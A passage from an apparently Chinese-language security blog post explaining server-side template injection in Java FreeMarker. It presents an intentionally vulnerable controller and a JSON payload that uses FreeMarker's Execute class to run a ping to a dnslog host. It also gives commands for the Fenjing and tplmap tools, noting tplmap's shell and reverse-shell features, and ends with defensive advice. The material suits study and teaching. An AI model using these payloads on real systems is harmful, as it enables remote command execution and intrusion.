        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> body<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/freemarker"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">freemarker</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> username<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> httpserver<span class="token punctuation">,</span><span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span><span class="token punctuation">{</span>
            <span class="token class-name">String</span> data <span class="token operator">=</span> <span class="token string">"1ooooooooooooooooooo~"</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> templateContent <span class="token operator">=</span> <span class="token string">"&lt;html&gt;&lt;body&gt;Hello "</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">" ${data}&lt;/body&gt;&lt;/html&gt;"</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> html <span class="token operator">=</span> <span class="token function">createHtmlFromString</span><span class="token punctuation">(</span>templateContent<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">createHtmlFromString</span><span class="token punctuation">(</span><span class="token class-name">String</span> templateContent<span class="token punctuation">,</span> <span class="token class-name">String</span> data<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">TemplateException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Configuration</span> cfg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">StringTemplateLoader</span> stringLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringTemplateLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        stringLoader<span class="token punctuation">.</span><span class="token function">putTemplate</span><span class="token punctuation">(</span><span class="token string">"myTemplate"</span><span class="token punctuation">,</span>templateContent<span class="token punctuation">)</span><span class="token punctuation">;</span>
        cfg<span class="token punctuation">.</span><span class="token function">setTemplateLoader</span><span class="token punctuation">(</span>stringLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Template</span> template <span class="token operator">=</span> cfg<span class="token punctuation">.</span><span class="token function">getTemplate</span><span class="token punctuation">(</span><span class="token string">"myTemplate"</span><span class="token punctuation">,</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        root<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">StringWriter</span> writer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">process</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span>writer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> writer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/template"</span><span class="token punctuation">,</span> method <span class="token operator">=</span>  <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">POST</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">template</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> templates<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token class-name">StringTemplateLoader</span> stringLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringTemplateLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> templateKey <span class="token operator">:</span> templates<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            stringLoader<span class="token punctuation">.</span><span class="token function">putTemplate</span><span class="token punctuation">(</span>templateKey<span class="token punctuation">,</span> templates<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>templateKey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        con<span class="token punctuation">.</span><span class="token function">setTemplateLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MultiTemplateLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TemplateLoader</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>stringLoader<span class="token punctuation">,</span>
            con<span class="token punctuation">.</span><span class="token function">getTemplateLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上述代码主要编译给定的模板字符串和数据，生成HTML进行输出</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623195253794.png" alt="image-20230623195253794"></p>
<p>模板注入的前提是在无过滤的情况下，使用模板来解析我们输入的字符，可以通过页面上的变化，来判断我们输入的内容是否被解析，如上图我们输入的内容被成功解析到页面上，并且没有过滤。</p>
<p>首先需要控制被攻击模板 /template 的内容，也就是要将本来无危害的模板文件实时更改为可攻击的模板内容。使用的payload</p>
<pre class="line-numbers language-none"><code class="language-none">{"hello.ftl": "&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;#assign ex=\"freemarker.template.utility.Execute\"?new()&gt; ${ ex(\"ping ilxwh0.dnslog.cn\") }&lt;title&gt;Hello!&lt;/title&gt;&lt;link href=\"/css/main.css\" rel=\"stylesheet\"&gt;&lt;/head&gt;&lt;body&gt;&lt;h2 class=\"hello-title\"&gt;Hello!&lt;/h2&gt;&lt;script src=\"/js/main.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623195337785.png" alt="image-20230623195337785"></p>
<p>关键代码在上图的红框中，接收用户传入的参数，使用keySet()获取key值，遍历相应的模块名字，使用StringTemplateLoader来加载模板内容，并使用putTemplate将key对应的value（也就是payload）写入templateKey中。这样就可以覆盖 hello.ftl 文件的内容，具体如下：</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623195633635.png" alt="image-20230623195633635"></p>
<p>重新更改了加载的模板内容后，然后直接访问受影响的模板文件路径，此时恶意的模板文件内容就会被加载成功了，并执行了系统命令</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623195646868.png" alt="image-20230623195646868"></p>
<p>dnslog平台也受到了请求</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623195702623.png" alt="image-20230623195702623"></p>
<p><strong>后言</strong></p>
<p>由于本篇文章篇幅过长，容易脑壳疼，所以分为上下篇，上篇大概介绍了几种语言常见的几种模板注入，下篇分析几个cms的模板注入，包括海洋cms，74cms，ofcms等</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>
<h2 id="十二、自动化工具">十二、自动化工具</h2>
<p><strong>1.手动安装，具体参考：</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a></p>
<pre><code>git clone https://github.com/Marven11/Fenjing
cd Fenjing
python -m pip install -r requirements.txt
python -m fenjing scan --url 'http://xxx/'
</code></pre>
<p>输入以上命令随后，cat /flag即可得到flag</p>
<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11108">https://xz.aliyun.com/t/11108</a>  --smarty模板</p>
<p><strong>2.这里推荐自动化工具tplmap，拿shell、执行命令、bind_shell、反弹shell、上传下载文件，Tplmap为SSTI的利用提供了很大的便利</strong></p>
<p>github地址：<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623190746095.png" alt="image-20230623190746095"></p>
<p>一键shell真香，还支持其他模板（Smarty，Mako，Tornado，Jinja2）的注入检测</p>
<h2 id="十三、漏洞防御">十三、漏洞防御</h2>
<ol>
<li>
<p>和其他的注入防御一样，绝对不要让用户对传入模板的内容或者模板本身进行控制</p>
</li>
<li>
<p>减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染方式，使用正规的模板渲染方法</p>
</li>
<li>
<p>尽可能加载静态模板文件</p>
</li>
<li>
<p>另一个选择是创建一个安全加固/沙箱环境，禁用或删除潜在的危险指令。</p>
</li>
</ol>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://hybcx.xyz/2023/08/06/qian-xi-ssti-lou-dong/">http://hybcx.xyz/2023/08/06/qian-xi-ssti-lou-dong/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">hybcx</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
        serverURLs: '',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/08/06/newscenter/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="攻防世界-NewsCenter">
                        
                        <span class="card-title">攻防世界-NewsCenter</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-08-06
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" class="post-category">
                                    攻防世界
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/08/06/qian-xi-xpath-zhu-ru/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="浅析Xpath注入">
                        
                        <span class="card-title">浅析Xpath注入</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-06
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" class="post-category">
                                    常见top漏洞
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.js"></script>


<!-- 代码语言 -->


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <a href="/about" target="_blank">hybcx</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">861.1k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    
        
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
            }
        </script>
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
